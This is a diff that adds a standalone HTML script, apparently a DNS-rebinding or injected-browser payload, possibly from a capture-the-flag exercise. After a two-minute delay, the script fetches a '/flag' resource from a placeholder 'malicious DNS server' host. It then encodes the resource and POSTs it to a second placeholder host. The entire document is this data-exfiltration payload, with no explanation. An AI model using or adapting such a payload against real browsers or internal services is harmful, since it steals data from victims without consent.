@@ -1,0 +1,24 @@
+<script>
+setTimeout(function() {
+  function toDataURL(url, callback) {
+    var xhr = new XMLHttpRequest();
+    xhr.onload = function() {
+      var reader = new FileReader();
+      reader.onloadend = function() {
+        callback(reader.result);
+      }
+      reader.readAsDataURL(xhr.response);
+    };
+      xhr.open('GET', url);
+      xhr.responseType = 'blob';
+      xhr.send();
+    }
+    toDataURL('http://<MyMaliciousDnsServer>:1337/flag', function(dataUrl) {
+      console.log('RESULT:', dataUrl)
+      http = new XMLHttpRequest();
+      http.open("POST", "http://<MyRemoteServerToGetThePNGFile>:8888", true);
+      var params = "flag="+dataUrl;
+      http.send(params);
+    })
+}, 120000);
+</script>
